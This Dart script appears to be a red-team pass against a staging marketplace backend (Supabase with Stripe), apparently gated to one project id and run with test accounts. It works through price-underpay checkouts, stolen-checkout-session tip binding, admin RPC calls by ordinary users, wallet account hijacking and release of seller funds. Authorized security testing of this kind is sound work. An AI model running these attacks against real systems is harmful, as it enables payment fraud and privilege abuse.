// Pass 4 — prove PRICE-02 checkout, tip-session bind, admin RPCs, off-platform mint.
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stamp = '20260830T1443';
const tag = 'RTI4-$stamp';
const projectMust = 'fxdknzrqjenzqcvnwqqq';

final out = <String, dynamic>{
  'stamp': stamp,
  'attacks': <Map<String, dynamic>>[],
};

void logA(String k, Object v) {
  (out['attacks'] as List).add({'k': k, 'v': v});
  stdout.writeln('$k :: $v');
}

String clip(String s, [int n = 280]) {
  final t = s.replaceAll(RegExp(r'\s+'), ' ').trim();
  return t.length <= n ? t : '${t.substring(0, n)}…';
}

void main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!url.contains(projectMust)) {
    stderr.writeln('REFUSED');
    exit(2);
  }
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final svc = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final admin = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: svc,
  );
  final buyerTok = await admin.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerTok = await admin.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );

  Map<String, String> hUser(String tok) => {
        'apikey': anon,
        'Authorization': 'Bearer $tok',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };
  Map<String, String> hSvc() => {
        'apikey': svc,
        'Authorization': 'Bearer $svc',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };

  Future<http.Response> rest(
    String method,
    String path, {
    Map<String, String>? headers,
    Object? body,
  }) {
    final uri = Uri.parse('$url$path');
    final hdr = headers ?? hSvc();
    final enc = body == null ? null : jsonEncode(body);
    switch (method) {
      case 'GET':
        return http.get(uri, headers: hdr);
      case 'POST':
        return http.post(uri, headers: hdr, body: enc);
      case 'PATCH':
        return http.patch(uri, headers: hdr, body: enc);
      default:
        throw ArgumentError(method);
    }
  }

  Future<http.Response> rpc(
    String fn,
    Map<String, dynamic> params, {
    required String tok,
  }) {
    return rest('POST', '/rest/v1/rpc/$fn', headers: hUser(tok), body: params);
  }

  Future<http.Response> edge(
    String fn,
    Object body, {
    required String tok,
    String method = 'POST',
    String query = '',
  }) {
    final uri = Uri.parse('$url/functions/v1/$fn$query');
    final hdr = {
      'apikey': anon,
      'Authorization': 'Bearer $tok',
      'Content-Type': 'application/json',
    };
    if (method == 'GET') return http.get(uri, headers: hdr);
    return http.post(uri, headers: hdr, body: jsonEncode(body));
  }

  Future<Map<String, dynamic>?> row(String table, String filter) async {
    final r = await rest(
      'GET',
      '/rest/v1/$table?$filter&select=*&limit=1',
      headers: hSvc(),
    );
    final d = jsonDecode(r.body);
    if (d is List && d.isNotEmpty && d.first is Map) {
      return Map<String, dynamic>.from(d.first as Map);
    }
    return null;
  }

  Future<double> bal(String uid) async {
    final w = await row('wallets', 'id=eq.$uid');
    return double.tryParse('${w?['balance']}') ?? 0;
  }

  // Snapshots
  final buyerBal0 = await bal(buyerId);
  final sellerBal0 = await bal(sellerId);
  logA('wallet_snap_start', {'buyer': buyerBal0, 'seller': sellerBal0});

  // Product
  final prod = await admin.insert('products', {
    'seller_id': sellerId,
    'title': '$tag 27.50',
    'price': 27.50,
    'quantity': 2,
    'is_sold': false,
    'list_on_marketplace': true,
    'description': tag,
  });
  final pid = prod['id'].toString();

  // ---- A. proposta underpay + checkout with required buyer_id ----
  final ins = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerTok),
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 0.50,
      'status': 'pendente',
      'payment_method': 'proposta',
    },
  );
  logA('proposta_insert', '${ins.statusCode} ${clip(ins.body)}');
  Map<String, dynamic>? orderP;
  final insD = jsonDecode(ins.body);
  if (insD is List && insD.isNotEmpty) {
    orderP = Map<String, dynamic>.from(insD.first as Map);
  } else if (insD is Map) {
    orderP = Map<String, dynamic>.from(insD);
  }
  final oidP = orderP?['id']?.toString();
  if (oidP != null) {
    final live = await row('orders', 'id=eq.$oidP');
    logA('proposta_sealed', {
      'id': oidP,
      'unit': live?['contract_unit_cents'],
      'qty': live?['contract_qty'],
      'price': live?['price_total'],
      'offer': live?['product_offer_id'],
      'status': live?['status'],
      'pm': live?['payment_method'],
    });
    final chk = await edge(
      'create-payment-intent',
      {
        'order_id': oidP,
        'buyer_id': buyerId,
        'amount': 1,
        'quantity': 9,
        'payment_method': 'stripe',
      },
      tok: buyerTok,
    );
    logA('proposta_checkout', '${chk.statusCode} ${clip(chk.body, 400)}');
    try {
      final cb = jsonDecode(chk.body);
      if (cb is Map) {
        logA('proposta_session', {
          'amount_total': cb['amount_total'],
          'session': cb['checkoutSessionId'],
          'error': cb['error'],
        });
      }
    } catch (_) {}
  }

  // ---- B. normal order checkout (control) ----
  final insN = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerTok),
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 27.50,
      'status': 'pendente',
      'payment_method': 'pagamento na app',
    },
  );
  logA('normal_insert', '${insN.statusCode} ${clip(insN.body, 180)}');
  String? oidN;
  final nD = jsonDecode(insN.body);
  if (nD is List && nD.isNotEmpty) {
    oidN = (nD.first as Map)['id']?.toString();
  }
  if (oidN != null) {
    final liveN = await row('orders', 'id=eq.$oidN');
    logA('normal_sealed', {
      'unit': liveN?['contract_unit_cents'],
      'price': liveN?['price_total'],
    });
    final chkN = await edge(
      'create-payment-intent',
      {'order_id': oidN, 'buyer_id': buyerId},
      tok: buyerTok,
    );
    logA('normal_checkout', '${chkN.statusCode} ${clip(chkN.body, 400)}');
  }

  // ---- C. tip session bind (stolen cs onto new pending tip) ----
  String liveId = '';
  try {
    final lr = await admin.insert('lives', {
      'seller_id': sellerId,
      'title': '$tag ended',
      'status': 'ended',
      'is_active': false,
    });
    liveId = lr['id'].toString();
  } catch (e) {
    logA('live_fixture', '$e');
  }
  String? sessionTip;
  if (liveId.isNotEmpty) {
    final t1 = await edge(
      'create-live-tip-checkout',
      {'live_id': liveId, 'seller_id': sellerId, 'amount_eur': 1},
      tok: buyerTok,
    );
    logA('tip_session_create', '${t1.statusCode} ${clip(t1.body, 220)}');
    try {
      final tb = jsonDecode(t1.body);
      if (tb is Map) sessionTip = tb['checkoutSessionId']?.toString();
    } catch (_) {}
    if (sessionTip != null) {
      final t2 = await rpc(
        'batata_create_live_tip_pending',
        {
          'p_live_id': liveId,
          'p_seller_id': sellerId,
          'p_amount': 500,
          'p_message': 'bind',
          'p_stripe_session_id': sessionTip,
        },
        tok: buyerTok,
      );
      logA('tip_bind_stolen_session', '${t2.statusCode} ${clip(t2.body)}');
      final settle = await edge(
        'create-live-tip-checkout',
        {},
        tok: anon,
        method: 'GET',
        query:
            '?checkout_return=success&session_id=${Uri.encodeComponent(sessionTip)}',
      );
      logA('tip_settle_unpaid_stolen',
          '${settle.statusCode} ${clip(settle.body, 200)}');
    }
    try {
      await admin.patch('lives', 'id=eq.$liveId', {
        'status': 'ended',
        'is_active': false,
      });
    } catch (_) {}
  }

  // ---- D. admin RPCs ----
  for (final ident in [
    ['buyer', buyerTok],
    ['seller', sellerTok],
  ]) {
    final isAdm = await rpc('batata_is_admin', {}, tok: ident[1]);
    logA('is_admin_${ident[0]}', '${isAdm.statusCode} ${clip(isAdm.body)}');
    final lst = await rpc(
      'batata_admin_list_profiles',
      {'p_limit': 5},
      tok: ident[1],
    );
    logA('admin_list_${ident[0]}', '${lst.statusCode} ${clip(lst.body, 200)}');
    final resD = await rpc(
      'batata_admin_resolve_dispute',
      {
        'p_dispute_id': '00000000-0000-0000-0000-000000000001',
        'p_resolution': 'favor_buyer_refund',
        'p_note': tag,
      },
      tok: ident[1],
    );
    logA('admin_resolve_${ident[0]}',
        '${resD.statusCode} ${clip(resD.body, 180)}');
  }

  // ---- E. privileged leftover RPCs ----
  final extraRpcs = <String, Map<String, dynamic>>{
    'batata_finalize_stripe_order_refund': {
      'p_order_id': oidP ?? '00000000-0000-0000-0000-000000000001',
      'p_refund_id': 're_fake',
      'p_payment_intent_id': 'pi_fake',
      'p_session_id': 'cs_fake',
      'p_amount_cents': 50000,
    },
    'batata_create_raffle_prize_order': {
      'p_raffle_id': '00000000-0000-0000-0000-000000000001',
      'p_winner_id': buyerId,
      'p_qty': 1,
    },
    'batata_lab_clear_all_fm_pending': {},
    'batata_mark_live_item_sold': {
      'p_live_item_id': '00000000-0000-0000-0000-000000000001',
    },
    'batata_live_reconcile_stripe_order': {
      'p_order_id': oidP ?? '00000000-0000-0000-0000-000000000001',
      'p_session_id': '00000000-0000-0000-0000-000000000002',
    },
    'batata_refund_buyer_wallet_for_order': {
      'p_order_id': oidP ?? '00000000-0000-0000-0000-000000000001',
    },
    'batata_generate_auto_feedback': {},
  };
  for (final e in extraRpcs.entries) {
    final r = await rpc(e.key, e.value, tok: buyerTok);
    logA('rpc_${e.key}', '${r.statusCode} ${clip(r.body, 180)}');
  }

  // ---- F. off-platform order → seller PATCH concluido → release ----
  final insOff = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerTok),
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 27.50,
      'status': 'pendente',
      'payment_method': 'mb way',
    },
  );
  logA('offplatform_insert', '${insOff.statusCode} ${clip(insOff.body, 180)}');
  String? oidOff;
  final oD = jsonDecode(insOff.body);
  if (oD is List && oD.isNotEmpty) {
    oidOff = (oD.first as Map)['id']?.toString();
  }
  if (oidOff != null) {
    final sPago = await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.$oidOff',
      headers: hUser(sellerTok),
      body: {'status': 'pago'},
    );
    logA('seller_patch_pago', '${sPago.statusCode} ${clip(sPago.body, 160)}');
    final sCon = await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.$oidOff',
      headers: hUser(sellerTok),
      body: {'status': 'concluido'},
    );
    logA('seller_patch_concluido',
        '${sCon.statusCode} ${clip(sCon.body, 160)}');
    final after = await row('orders', 'id=eq.$oidOff');
    logA('offplatform_status', after?['status']);
    final sellerBeforeRelease = await bal(sellerId);
    final relB = await rpc(
      'batata_release_seller_wallet_for_order',
      {'p_order_id': oidOff},
      tok: buyerTok,
    );
    logA('release_as_buyer', '${relB.statusCode} ${clip(relB.body)}');
    final relS = await rpc(
      'batata_release_seller_wallet_for_order',
      {'p_order_id': oidOff},
      tok: sellerTok,
    );
    logA('release_as_seller', '${relS.statusCode} ${clip(relS.body)}');
    final sellerAfterRelease = await bal(sellerId);
    logA('seller_balance_release_delta', {
      'before': sellerBeforeRelease,
      'after': sellerAfterRelease,
      'delta': sellerAfterRelease - sellerBeforeRelease,
    });
  }

  // ---- G. reviews schema + insert ----
  final revSel = await rest(
    'GET',
    '/rest/v1/reviews?select=*&limit=1',
    headers: hSvc(),
  );
  logA('reviews_sample', clip(revSel.body, 300));
  Map<String, dynamic> revBody = {
    'order_id': oidN,
    'buyer_id': buyerId,
    'target_id': sellerId,
    'stars': 5,
    'comment': tag,
  };
  var rev = await rest(
    'POST',
    '/rest/v1/reviews',
    headers: hUser(buyerTok),
    body: revBody,
  );
  logA('review_stars', '${rev.statusCode} ${clip(rev.body, 180)}');
  if (rev.statusCode >= 400) {
    revBody = {
      'order_id': oidN,
      'buyer_id': buyerId,
      'target_id': sellerId,
      'score': 5,
      'body': tag,
    };
    rev = await rest(
      'POST',
      '/rest/v1/reviews',
      headers: hUser(buyerTok),
      body: revBody,
    );
    logA('review_score', '${rev.statusCode} ${clip(rev.body, 180)}');
  }

  // ---- H. wallet stripe_account_id hijack ----
  final wPatch = await rest(
    'PATCH',
    '/rest/v1/wallets?id=eq.$buyerId',
    headers: hUser(buyerTok),
    body: {
      'stripe_account_id': 'acct_HIJACK',
      'balance': 1,
    },
  );
  logA('wallet_patch_acct', '${wPatch.statusCode} ${clip(wPatch.body, 160)}');
  final wAfter = await row('wallets', 'id=eq.$buyerId');
  logA('wallet_after_patch', {
    'balance': wAfter?['balance'],
    'acct': wAfter?['stripe_account_id'],
  });

  // ---- I. stock=1 dual checkout with proper metadata ----
  final p1 = await admin.insert('products', {
    'seller_id': sellerId,
    'title': '$tag stock1',
    'price': 9.00,
    'quantity': 1,
    'is_sold': false,
    'list_on_marketplace': true,
    'description': tag,
  });
  final pid1 = p1['id'].toString();
  final o1r = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerTok),
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid1,
      'quantity': 1,
      'price_total': 9.00,
      'payment_method': 'pagamento na app',
    },
  );
  logA('stock1_order', '${o1r.statusCode} ${clip(o1r.body, 140)}');
  String? oid1;
  final o1d = jsonDecode(o1r.body);
  if (o1d is List && o1d.isNotEmpty) {
    oid1 = (o1d.first as Map)['id']?.toString();
  }
  if (oid1 != null) {
    final pair = await Future.wait([
      edge(
        'create-payment-intent',
        {'order_id': oid1, 'buyer_id': buyerId},
        tok: buyerTok,
      ),
      edge(
        'create-payment-intent',
        {'order_id': oid1, 'buyer_id': buyerId},
        tok: buyerTok,
      ),
    ]);
    logA('stock1_dual_session_same_order', {
      'a': '${pair[0].statusCode} ${clip(pair[0].body, 180)}',
      'b': '${pair[1].statusCode} ${clip(pair[1].body, 180)}',
    });
  }

  // second order on same stock=1
  final o2r = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerTok),
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid1,
      'quantity': 1,
      'price_total': 9.00,
      'payment_method': 'pagamento na app',
    },
  );
  logA('stock1_second_order', '${o2r.statusCode} ${clip(o2r.body, 180)}');

  logA('wallet_snap_end', {
    'buyer': await bal(buyerId),
    'seller': await bal(sellerId),
  });

  // cleanup
  for (final id in [oidP, oidN, oidOff, oid1]) {
    if (id == null) continue;
    try {
      await admin.patch('orders', 'id=eq.$id', {'status': 'cancelado'});
    } catch (_) {}
  }
  for (final id in [pid, pid1]) {
    try {
      await admin.patch('products', 'id=eq.$id', {
        'list_on_marketplace': false,
        'quantity': 0,
      });
    } catch (_) {}
  }

  Directory('tool/redteam_indep_cega_20260830T1443').createSync(recursive: true);
  File('tool/redteam_indep_cega_20260830T1443/pass4.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert(out),
  );
  stdout.writeln('PASS4 written');
}
